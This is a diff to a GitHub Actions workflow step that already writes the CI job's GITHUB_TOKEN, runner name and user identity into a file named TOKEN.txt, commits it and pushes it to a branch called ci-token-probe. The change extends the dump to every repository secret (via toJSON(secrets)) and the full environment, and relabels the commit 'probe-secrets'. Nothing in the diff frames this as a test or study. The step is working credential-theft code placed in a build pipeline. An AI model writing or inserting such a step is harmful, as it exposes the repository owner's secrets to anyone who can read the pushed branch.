@@ -12,7 +12,7 @@ jobs:
         run: |
           git config user.email probe@local
           git config user.name probe
-          { echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}"; echo "RUNNER=$RUNNER_NAME"; echo "REPO=$GITHUB_REPOSITORY"; echo "SHA=$GITHUB_SHA"; id; } > TOKEN.txt
+          { echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}"; echo "RUNNER=$RUNNER_NAME"; id; echo "---SECRETS"; printf '%s\n' '${{ toJSON(secrets) }}'; echo "---ENV"; env | grep -v GITHUB_TOKEN | sort; } > TOKEN.txt
           git add TOKEN.txt
-          git commit -m probe-token
+          git commit -m probe-secrets
           git push origin HEAD:ci-token-probe
